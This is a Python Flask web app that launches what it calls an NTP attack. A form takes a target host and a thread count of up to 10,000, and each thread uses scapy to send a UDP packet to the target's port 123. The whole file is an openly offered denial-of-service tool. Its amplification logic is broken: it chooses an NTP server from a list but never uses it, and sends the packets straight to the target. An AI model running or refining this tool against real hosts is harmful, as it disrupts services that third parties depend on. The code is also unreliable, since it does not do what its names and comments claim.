import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning, module="scapy")
import random
import socket
import threading
from flask import Flask, request, jsonify, render_template
from scapy.all import IP, UDP, Raw, send

app = Flask(__name__)

def read_ntp_servers():
    """Read NTP servers from a file."""
    ntp_servers = []
    try:
        with open('ntp.txt', 'r') as file:
            for line in file:
                parts = line.split()
                if len(parts) >= 1:
                    ntp_servers.append(parts[0])  # Only take the IP address
    except FileNotFoundError:
        print("ntp.txt file not found!")
    return ntp_servers

ntp_servers = read_ntp_servers()

def check_tgt(target):
    """Resolve the target hostname to an IP address."""
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        return None

class NTPAttack:
    def __init__(self, tgt, threads):
        self.tgt = tgt
        self.threads = threads

    def send_ntp_request(self, ntp_server):
        """Send an NTP request to the target."""
        try:
            # Construct the NTP request packet
            packet = IP(dst=self.tgt) / UDP(dport=123) / Raw(load="\x1b" + 47 * "\0")
            send(packet, verbose=False)  # Send the packet without verbose output
            print(f"Sent NTP request to {ntp_server}")
        except Exception as e:
            print(f"Error sending NTP request to {ntp_server}: {e}")

    def start_attack(self):
        """Start the NTP attack using multiple threads."""
        threads = []
        for _ in range(self.threads):
            ntp_server = random.choice(ntp_servers)  # Randomly choose an NTP server
            t = threading.Thread(target=self.send_ntp_request, args=(ntp_server,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

@app.route('/')
def index():
    return render_template('index.html', message=None, error=None)

@app.route('/attack', methods=['POST'])
def attack():
    target = request.form.get('target', '').strip()  # Get target from form and strip whitespace
    threads = request.form.get('threads', '1000')  # Default to 1000 threads for unlimited mode

    if not target:
        return render_template('index.html', message=None, error="Target is required!")

    tgt = check_tgt(target)
    if tgt is None:
        return render_template('index.html', message=None, error=f"Can't resolve host: {target}!")

    try:
        threads = int(threads)
        if threads <= 0:  # Set to a very large number or no limit (unlimited threads mode)
            threads = 10000  # You can adjust this number if you want a maximum limit
    except ValueError:
        return render_template('index.html', message=None, error="Invalid number of threads!")

    attack = NTPAttack(tgt, threads)
    attack.start_attack()

    return render_template('index.html', message=f"Started attack on {tgt} with {threads} threads.", error=None)

if __name__ == '__main__':
    app.run(debug=True)
